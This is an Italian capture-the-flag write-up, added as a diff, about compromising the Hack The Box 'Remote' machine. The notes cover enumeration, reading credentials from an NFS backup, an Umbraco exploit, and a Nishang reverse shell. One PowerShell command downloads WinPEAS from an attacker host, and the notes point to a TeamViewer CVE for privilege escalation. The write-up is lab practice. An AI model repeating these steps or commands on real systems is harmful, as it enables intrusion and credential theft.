@@ -1,0 +1,43 @@
+Nmap scan trova porta 80 con ftp, nulla dentro. non usabile
+Gobuster trova un sacco di directory. Da segnare sicuramente la install.
+Sul sito ho un form per il login 
+
+http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms
+
+smbclient non accedibile. Analizzo porta 111 dove c'è il servizio rpcbind
+
+Riesco ad effettuare una exploit su la porta 111 tramite nfs e collegarmi alla directory di backup in remoto.
+
+Credentials all'interno di App_data/umbraco.config
+La password è cryptata, con sha1 la decodo e trovo username e password.
+
+Faccio il login e trovo che questa versione di Umbraco è vulnerabile da un exploit tramite searchsploit.
+Downloado lo script e procedo a modificarlo con i dati opportuni
+
+Funziona se metto il ping quindi ho della code execution.
+Mi basta inserire una reverse shell per prendere il controllo del pc.
+
+È una macchina windows, quindi le solite non andranno bene. Nel sistema è presente la Nishang powershell script che fa al caso nostro
+
+La modifico inserendo alla fine la linea corrispondente.
+Apro un server con python in modo da inviare lo script reverseShell..py alla macchina remota ed utilizzarlo con lo script 4..py
+
+Lo script exploit viene modificato per prendere la reverse shell ed utilizzarla in una powershell.
+
+apro quindi un server e un netcat, tutto funziona correttamente ed ho la mia shell
+
+Ho la user flag. Ora serve la priviledge escalation
+
+È una macchina windows, ha senso prima provare quindi WinPEAS
+
+Invio il file winPEAS con il seguente comando
+cd ../../../Users/Public/Documents
+iwr http://10.10.14.10:8000/WinPEAS.exe -OutFile winPEAS.exe
+
+Avvio con .\winPEAS.exe
+
+Non ho trovato nulla di che ma facendo
+tasklist /svc vedo che è presente il servizio TeamViewer7 che è un servizio vulnerabile a
+CVE-2019-18988
+
+[to-be-continued-----]
